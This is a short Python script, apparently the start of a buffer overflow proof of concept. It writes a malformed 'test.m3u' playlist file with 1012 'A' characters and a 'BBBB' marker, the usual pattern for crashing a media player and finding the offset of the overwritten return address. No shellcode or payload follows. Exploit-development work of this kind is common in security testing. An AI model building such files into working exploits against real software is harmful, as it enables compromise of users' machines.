p = open("test.m3u", "w")
payload = "A" * 1012 + "BBBB"
p.write(payload)
p.close()